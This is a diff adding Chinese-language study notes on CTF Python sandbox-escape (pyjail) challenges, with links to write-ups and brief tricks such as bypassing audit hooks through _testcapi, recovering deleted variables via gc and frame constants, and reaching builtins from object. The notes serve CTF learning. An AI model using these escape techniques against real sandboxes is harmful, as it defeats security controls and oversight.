+- [crator](https://outgoing-shoe-387.notion.site/Idek-CTF-2024-web-crator-WriteUp-43b1e90d7b7d40b3ad8b338fa9c08bc5)
+    - 如何更换函数的内部代码从而绕过沙盒。另外这篇wp里记录了很多不错的python沙盒逃逸学习链接
+- [Monkey's Paw](https://blog.ryukk.dev/ctfs/write-up/2024/1337up-live-ctf/misc)
+  - "反其道而行之"的pyjail。要求函数、属性等内容必须是`__xx__`的形式，且除函数和属性外的值必须是字符串。关键是可以用`__len__`取出数字
+  - 其他解法： **monkey's paw** 。稍微提一嘴，根据官方解法（`oh_word`），题目的过滤好像写错了……预期解是用`__doc__`取出字符串，结果因为过滤的问题直接就能在payload里用字符串
+- [Korra](https://github.com/nononovak/glacierctf-2024-writeups/blob/main/Korra%20(writeup).md)
+  - 只能用`abcdef"{>:}`的pyjail。关键是利用f-string的format语法，比如`f"""{"a">"a":d}"""`是字符0
+- [cobras-den](https://github.com/negasora/Some-CTF-Solutions/tree/master/irisctf-2025/misc/cobras-den)
+  - 用上之前见过的知识了（喜）。再看看大家的做法： **cobras-den**
+- [warden](https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/warden),[wp](https://github.com/Seraphin-/ctf/blob/master/2025/irisctf/warden.md)
+  - 一道绕audithook的pyjail，和之前见过的Diligent Auditor构造类似：可以从某个指定模块导入一个函数，然后用指定参数调用那个函数。至于怎么找模块，还真没什么技巧，除了把builtins里的模块一个一个看一遍。`_testcapi`模块里的`run_in_subinterp`可以开启一个新的子解释器，同时移除所有的audit hook和seccomp
+  - `\r`可以被看作是python源码里的空格和换行，而且可以通过input输入
+  - 可以用`from...import...as __getattr__`覆盖`__getattr__`，然后调用`from __main__ import xxx`就能调用`__getattr__`，进而调用引入的函数了
+  - 其他解法： **warden** 。其实都是预期解，几乎完全一样
+- [Another Impossible Escape](https://r3kapig-not1on.notion.site/Srdnlen-CTF-2025-Writeup-by-r4kapig-181ec1515fb98004b3e2c42e74ce5fc5)
+  - 感觉应该把这类可以输入多个payload的pyjail与只能输入一个payload的pyjail区分开。这类题可以用海象运算符（`:=`）给变量赋值
+  - 负号(`-`)被禁时可以用取反`～`拿到负数（用于负索引）
+  - 可以用Garbage Collector interface（gc模块）获取被删除的变量值
+  - 另一种解法： https://gist.github.com/lebr0nli/1923a935134a2643ac58cf94ac59fd94 。用`sys._getframe()`里的`f_code.co_consts`也能拿到被删除的变量
+  - [官方wp](https://github.com/srdnlen/srdnlenctf-2025_public/blob/main/misc_Another_Impossible_Escape)反而最复杂，要用gcore命令给正在运行的python线程生成一个core文件，然后grep出里面的flag
+- [Farquaad](https://hackmd.io/@r2dev2/S1P0RYHYke)
+  - eval+无builtins+过滤`e`
+  - 技巧是用`:=`从而在eval里实现赋值；`().__class__.__mro__[1]`可以拿到object;`object.__dict__["getattr"]`。有了getattr就能从object身上拿到builtins了
+  - 其他解法： **Farquaad**
+- pyjail cheatsheet： https://shirajuki.js.org/blog/pyjail-cheatsheet
+
 ## Tools
 
 又是没例题的一天……
@@ -2529,3 +2863,5 @@ $ cd a/b
     - http://mcatutorials.com/mca-tutorials-jpeg-file-layout-format-2-c-practical.php
 384. [Ancient paper](https://ctftime.org/task/29955)
 - 解码IBM punchcard
+385. [Mikumikubeam](https://hackmd.io/@r2dev2/S1P0RYHYke)
+- 破解imagemagick的`-stegano`选项
